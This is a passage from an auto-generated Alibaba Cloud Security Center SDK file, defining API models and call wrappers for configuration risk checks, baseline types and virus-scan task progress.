    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRestorePlans(request: DescribeRestorePlansRequest): DescribeRestorePlansResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestorePlansWithOptions(request, runtime);
}

model DescribeRiskCheckItemResultRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  itemId?: long(name='ItemId', description='The ID of the check item.

>  For more information about the IDs and details of the check items that can be used in configuration assessment, see [DescribeRiskCheckResult](~~DescribeRiskCheckResult~~).', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='173.128.XX.XX'),
}

model DescribeRiskCheckItemResultResponseBody = {
  pageContentResource?: {
    contentResource?: map[string]any(name='ContentResource', description='The data of the affected assets on each page in a dynamic table.', example='{"resultStatus":\\[{"id":32183150,"status":"failed"}],"columns":\\[{"title":"Zone","key":"RegionId"},{"title":"Database instance ID","key":"DBInstanceId"},{"title":"Error entry value","key":"VulValue"}],"values":\\[{"DBInstanceId":{"type":"link","value":"dds-bp144b42843\\*\\*\\*\\*\\n","url":"https://mongodb.console.aliyun.com/replicate/cn-hangzhou/instances/dds-bp144b42843\\*\\*\\*\\*/basicInfo"},"VulValue":{"type":"link","value":"0.0.0.0/0","url":"https://mongodb.console.aliyun.com/replicate/cn-hangzhou/instances/dds-bp144b42843\\*\\*\\*\\*/whiteList"},"RegionId":{"type":"text","value":"cn-hangzhou"}}],"emptyGridValue":{"type":"text","value":"No data found"},"type":"grid"}'),
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='3'),
    pageSize?: int32(name='PageSize', description='The number of entries returned on each page.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageContentResource', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskCheckItemResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckItemResultResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckItemResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResultWithOptions(request: DescribeRiskCheckItemResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckItemResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemId)) {
    query['ItemId'] = request.itemId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckItemResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckItemResultRequest
  * @return DescribeRiskCheckItemResultResponse
 */
// Deprecated
async function describeRiskCheckItemResult(request: DescribeRiskCheckItemResultRequest): DescribeRiskCheckItemResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckItemResultWithOptions(request, runtime);
}

model DescribeRiskCheckResultRequest {
  assetType?: string(name='AssetType', description='The type of the cloud service whose configuration assessment result you want to query. For more information about the description of the cloud service specified by this parameter, see the check item table in the "Response parameters" section of this topic.', example='RDS'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  groupId?: long(name='GroupId', description='The type of the check item that you want to query. Valid values:

*   **1**: identity authentication and permissions
*   **2**: network access control
*   **3**: log audit
*   **4**: data security
*   **5**: monitoring and alerting
*   **6**: basic security protection

>  If you do not specify this parameter, all types of check items are queried by default.', example='1'),
  itemIds?: [ string ](name='ItemIds', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the check item. For more information about the description of the check item name, see the check item table in the "Response parameters" section of this topic.', example='ALB_NetWorkAccessControl'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  queryFlag?: string(name='QueryFlag', description='Specifies whether the check item is supported by the cloud service. Valid values:

*   **enabled**: The check item is supported by the cloud service.
*   **disabled**: The check item is not supported by the cloud service.', example='enabled'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the check item that you want to query. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  status?: string(name='Status', description='The status of the check result. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass'),
}

model DescribeRiskCheckResultResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      affectedCount?: int32(name='AffectedCount', description='The number of affected assets.', example='0'),
      checkTime?: long(name='CheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1639429164000'),
      itemId?: long(name='ItemId', description='The ID of the check item. For more information about the description of the check item ID, see the check item table in the "Response parameters" section of this topic.', example='1'),
      remainingTime?: int32(name='RemainingTime', description='The time when the next check will be performed.', example='0'),
      repairStatus?: string(name='RepairStatus', description='Indicates whether the risks that are detected for the check item can be fixed. Valid values:

*   **enabled**: yes
*   **disabled**: no', example='disabled'),
      riskAssertType?: string(name='RiskAssertType', description='The type of the affected assets.', example='ECS'),
      riskItemResources?: [ 
        {
          contentResource?: map[string]any(name='ContentResource', description='The details about the check result.'),
          resourceName?: string(name='ResourceName', description='The title in the details. Valid values:

*   **bestPractice**: description
*   **influence**: risk
*   **suggestion**: solution
*   **helpResource**: reference', example='bestPractice'),
        }
      ](name='RiskItemResources', description='An array that consists of the details about the check item.'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sort?: int32(name='Sort', description='The sequence number of the check result. The check items are sorted based on the sequence number.', example='1'),
      startStatus?: string(name='StartStatus', description='Indicates whether the check item is supported by the cloud service. Valid values:

*   **enabled**: The check item is supported by the cloud service.
*   **disable**: The check item is not supported by the cloud service.', example='enabled'),
      status?: string(name='Status', description='The status of the check result. Valid values:

*   **pass**
*   **failed**
*   **running**
*   **waiting**
*   **ignored**
*   **falsePositive**', example='pass'),
      taskId?: long(name='TaskId', description='The ID of the check task.', example='15384933'),
      title?: string(name='Title', description='The name of the check item.', example='RDS - Whitelist Configuration'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   Identity authentication and permissions
*   Network access control
*   Log audit
*   Data security
*   Monitoring and alerting
*   Basic security protection', example='Log audit'),
    }
  ](name='List', description='An array that consists of the check items.'),
  pageCount?: int32(name='PageCount', description='The total number of pages returned.', example='20'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AD271C07-4ACE-413D-AA9B-F14FD3B7717F'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='12'),
}

model DescribeRiskCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResultWithOptions(request: DescribeRiskCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.itemIds)) {
    query['ItemIds'] = request.itemIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryFlag)) {
    query['QueryFlag'] = request.queryFlag;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckResultRequest
  * @return DescribeRiskCheckResultResponse
 */
// Deprecated
async function describeRiskCheckResult(request: DescribeRiskCheckResultRequest): DescribeRiskCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckResultWithOptions(request, runtime);
}

model DescribeRiskCheckSummaryRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the Alibaba Cloud account that is added as a member by using the multi-account control feature.', example='1232428423234****'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeRiskCheckSummaryResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78740F'),
  riskCheckSummary?: {
    affectedAssetCount?: int32(name='AffectedAssetCount', description='The number of affected assets.', example='0'),
    disabledRiskCount?: int32(name='DisabledRiskCount', description='The number of the check items that fail the check.', example='0'),
    enabledRiskCount?: int32(name='EnabledRiskCount', description='The number of the check items that pass the check.', example='3'),
    groups?: [ 
      {
        countByStatus?: [ 
          {
            count?: int32(name='Count', description='The number of detected risk items.', example='2'),
            status?: string(name='Status', description='The status of the check item after the check is finished. Valid values:

*   **pass**: The check item passes the check, which indicates that the check item is normal.
*   **failed**: The check item fails the check, which indicates that risks are detected for the check item.', example='pass'),
          }
        ](name='CountByStatus', description='An array that consists of the statistics about check results.'),
        id?: long(name='Id', description='The ID of the check item type.', example='1'),
        remainingTime?: int32(name='RemainingTime', description='The remaining time before the check is complete.', example='0'),
        sort?: int32(name='Sort', description='The sequence number of the check item type in the **All Types** drop-down list in the Security Center console.', example='1'),
        status?: string(name='Status', description='The status of the check. Valid values:

*   **finish**: The check is finished.
*   **running**: The check is in process.
*   **waiting**: The check is pending.
*   **notStart**: The check is not started.', example='finish'),
        title?: string(name='Title', description='The type of the check item.', example='Identity authentication and permissions'),
      }
    ](name='Groups', description='An array that consists of the statistics about each type of check items.'),
    itemCount?: int32(name='ItemCount', description='The number of check items.', example='4'),
    previousCount?: int32(name='PreviousCount', description='The number of risk items detected in the last check.', example='0'),
    previousTime?: long(name='PreviousTime', description='The timestamp of the last check. Unit: milliseconds.', example='1545012926000'),
    riskCount?: int32(name='RiskCount', description='The number of detected risk items.', example='1'),
    riskLevelCount?: [ 
      {
        count?: int32(name='Count', description='The number of check items at the specified risk level.', example='1'),
        key?: string(name='Key', description='The risk level of the check items. Valid values of risk levels:

*   **high**
*   **medium**
*   **low**', example='medium'),
      }
    ](name='RiskLevelCount', description='An array that consists of the number of check items at each risk level.'),
    riskRate?: float(name='RiskRate', description='The proportion of risk items to all check items.', example='0.25'),
  }(name='RiskCheckSummary', description='The summary information about the check results of cloud service configurations.'),
}

model DescribeRiskCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskCheckSummaryResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckSummaryRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummaryWithOptions(request: DescribeRiskCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeRiskCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskCheckSummaryRequest
  * @return DescribeRiskCheckSummaryResponse
 */
// Deprecated
async function describeRiskCheckSummary(request: DescribeRiskCheckSummaryRequest): DescribeRiskCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskCheckSummaryWithOptions(request, runtime);
}

model DescribeRiskItemTypeRequest {
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeRiskItemTypeResponseBody = {
  list?: [ 
    {
      id?: long(name='Id'),
      title?: string(name='Title'),
    }
  ](name='List'),
  requestId?: string(name='RequestId'),
}

model DescribeRiskItemTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskItemTypeResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskItemTypeRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemTypeWithOptions(request: DescribeRiskItemTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskItemTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskItemType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskItemTypeRequest
  * @return DescribeRiskItemTypeResponse
 */
// Deprecated
async function describeRiskItemType(request: DescribeRiskItemTypeRequest): DescribeRiskItemTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskItemTypeWithOptions(request, runtime);
}

model DescribeRiskListCheckResultRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance ID of the cloud service. Separate multiple IDs with commas (,).

>  If you do not specify this parameter, an empty list is returned.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.57.XX.XX'),
}

model DescribeRiskListCheckResultResponseBody = {
  list?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud service.', example='rm-bp1e8t4q15sr3****'),
      riskCount?: long(name='riskCount', description='The total number of risk items detected in the current cloud service.', example='3'),
    }
  ](name='List', description='The number of risk items for each cloud service.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3BFB4989-A108-46A4-954E-FF7EF02D1078'),
}

model DescribeRiskListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskListCheckResultResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request DescribeRiskListCheckResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResultWithOptions(request: DescribeRiskListCheckResultRequest, runtime: Util.RuntimeOptions): DescribeRiskListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request DescribeRiskListCheckResultRequest
  * @return DescribeRiskListCheckResultResponse
 */
// Deprecated
async function describeRiskListCheckResult(request: DescribeRiskListCheckResultRequest): DescribeRiskListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskListCheckResultWithOptions(request, runtime);
}

model DescribeRiskTypeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.X.X'),
}

model DescribeRiskTypeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F22037B5-FCE4-5178-A9E7-71798E1F9270'),
  riskTypes?: [ 
    {
      alias?: string(name='Alias', description='The alias of the baseline type.', example='Redis unauthorized access high exploit vulnerability risk'),
      subTypes?: [ 
        {
          alias?: string(name='Alias', description='The alias of the baseline subtype.', example='Redis unauthorized access high exploit vulnerability risk'),
          checkDetails?: [ 
            {
              checkDesc?: string(name='CheckDesc', description='The description of the baseline.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
              checkId?: long(name='CheckId', description='The ID of the baseline.', example='1299'),
              checkItem?: string(name='CheckItem', description='The baseline.', example='Ensure password expiration period is set.'),
              rules?: [ 
                {
                  optional?: int32(name='Optional', description='Indicates whether the baseline can be edited. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
                  paramList?: [ 
                    {
                      enumValue?: string(name='EnumValue', description='If the value of paramType is 1, this parameter is empty. If the value of paramType is 2, this parameter provides the options that can be selected for paramType.', example='0,1,2,3'),
                      maxValue?: int32(name='MaxValue', description='The maximum value of the parameter.', example='999'),
                      minValue?: int32(name='MinValue', description='The minimum value of the parameter.', example='1'),
                      paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the parameter.', example='7'),
                      paramDesc?: string(name='ParamDesc', description='The description of the parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                      paramName?: string(name='ParamName', description='The name of the parameter.', example='range_val'),
                      paramType?: int32(name='ParamType', description='The configuration type of the parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
                    }
                  ](name='ParamList', description='An array that consists of the parameters in the rule for the baseline.'),
                  ruleDesc?: string(name='RuleDesc', description='The description of the rule for the baseline.', example='Please customize the password expiration time detection standard as'),
                  ruleId?: string(name='RuleId', description='The ID of the rule for the baseline.', example='audit.audit_policy.auditpolicychange.cus'),
                }
              ](name='Rules', description='An array that consists of the rule details about the baseline.'),
            }
          ](name='CheckDetails', description='An array that consists of the check details about the baseline subtype.'),
          typeName?: string(name='TypeName', description='The name of the baseline subtype.', example='hc_exploit_redis'),
        }
      ](name='SubTypes', description='An array that consists of the information about baseline subtypes.'),
      typeName?: string(name='TypeName', description='The name of the baseline type.', example='hc_exploit'),
    }
  ](name='RiskTypes', description='An array that consists of the information about baseline types.'),
}

model DescribeRiskTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRiskTypeResponseBody(name='body'),
}

async function describeRiskTypeWithOptions(request: DescribeRiskTypeRequest, runtime: Util.RuntimeOptions): DescribeRiskTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRiskType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRiskType(request: DescribeRiskTypeRequest): DescribeRiskTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRiskTypeWithOptions(request, runtime);
}

model DescribeRisksRequest {
  lang?: string(name='Lang'),
  limit?: int32(name='Limit'),
  riskId?: long(name='RiskId'),
  riskName?: string(name='RiskName'),
}

model DescribeRisksResponseBody = {
  requestId?: string(name='RequestId'),
  risks?: [ 
    {
      riskDetail?: string(name='RiskDetail'),
      riskId?: long(name='RiskId'),
      riskName?: string(name='RiskName'),
      riskType?: string(name='RiskType'),
      subRiskType?: string(name='SubRiskType'),
      subTypeAlias?: string(name='SubTypeAlias'),
      typeAlias?: string(name='TypeAlias'),
    }
  ](name='Risks'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeRisksResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRisksResponseBody(name='body'),
}

async function describeRisksWithOptions(request: DescribeRisksRequest, runtime: Util.RuntimeOptions): DescribeRisksResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.limit)) {
    query['Limit'] = request.limit;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRisks',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeRisks(request: DescribeRisksRequest): DescribeRisksResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRisksWithOptions(request, runtime);
}

model DescribeSasPmAgentListRequest {
  lang?: string(name='Lang', example='en'),
  uuids?: string(name='Uuids', example='inet-cb7ae5ee-b2bc-4581-b616-62495f5d****,inet-37cf0e4f-55cc-4b84-8073-b348b4b4****'),
}

model DescribeSasPmAgentListResponseBody = {
  requestId?: string(name='RequestId', example='8EF3ACC2-9400-5B64-B72D-4A1D35113750'),
  sasPmAgentList?: [ 
    {
      aliyunAssistId?: string(name='AliyunAssistId', example='mi-hz034jn***yxhc0'),
      aliyunMonitorId?: string(name='AliyunMonitorId', example='5d5ef6be-54ff-11ed-82cf-8f01475e****'),
      assistInstallResult?: int32(name='AssistInstallResult', example='0'),
      assistInstallStatus?: int32(name='AssistInstallStatus', example='1'),
      monitorInstallResult?: int32(name='MonitorInstallResult', example='1'),
      monitorInstallStatus?: int32(name='MonitorInstallStatus', example='1'),
      uuid?: string(name='Uuid', example='87f1724d-075e-48d3-95fd-78c2dd36****'),
    }
  ](name='SasPmAgentList'),
}

model DescribeSasPmAgentListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSasPmAgentListResponseBody(name='body'),
}

async function describeSasPmAgentListWithOptions(request: DescribeSasPmAgentListRequest, runtime: Util.RuntimeOptions): DescribeSasPmAgentListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSasPmAgentList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSasPmAgentList(request: DescribeSasPmAgentListRequest): DescribeSasPmAgentListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSasPmAgentListWithOptions(request, runtime);
}

model DescribeScanTaskProgressRequest {
  taskId?: long(name='TaskId', description='The ID of the virus scan task.

>  You can call the [StartVirusScanTask](~~StartVirusScanTask~~) operation to query the IDs of virus scan tasks.', example='282832'),
}

model DescribeScanTaskProgressResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='EA15BA8A-D631-4375-8D40-CB7C769B0279'),
  scanTaskProgress?: string(name='ScanTaskProgress', description='The progress of the virus scan task. Valid values:

*   **init**: The task is being initialized.
*   **Processing**: The task is running.
*   **Success**: The task is complete.
*   **Failed**: The task fails.', example='Success'),
  targetInfo?: string(name='TargetInfo', description='The information about the asset on which the virus scan task runs. The value is a string that consists of JSON arrays. Each element in a JSON array is a JSON struct that contains the following fields:

*   **type**: the type of the asset on which the virus scan task runs. Valid values:

    *   **groupId**: server group.
    *   **uuid**: server.

*   **name**: the name of the server group or server.

*   **target**: the asset on which the virus scan task runs. The value of this field varies based on the value of the type field.

    *   If the value of **type** is **groupId**, the value of this field is the ID of the server group.
    *   If the value of **type** is **uuid**, the value of this field is the UUID of the server.', example='[{"type":"uuid","name":"host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
}

model DescribeScanTaskProgressResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeScanTaskProgressResponseBody(name='body'),
}

async function describeScanTaskProgressWithOptions(request: DescribeScanTaskProgressRequest, runtime: Util.RuntimeOptions): DescribeScanTaskProgressResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeScanTaskProgress',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeScanTaskProgress(request: DescribeScanTaskProgressRequest): DescribeScanTaskProgressResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeScanTaskProgressWithOptions(request, runtime);
}

model DescribeScanTaskStatisticsRequest {
  levels?: string(name='Levels', example='serious,suspicious,remind'),
}

model DescribeScanTaskStatisticsResponseBody = {
  dealedRiskNum?: int32(name='DealedRiskNum', example='11'),
  personalTaskNum?: long(name='PersonalTaskNum', example='11'),
  requestId?: string(name='RequestId', example='765EDBDE-1686-5DBA-B76F-2E0XXXXXXX'),
  totalTaskNum?: long(name='TotalTaskNum', example='11'),
  userNum?: long(name='UserNum', example='11'),
}

model DescribeScanTaskStatisticsResponse = {
  headers: map[string]string(name='headers'),
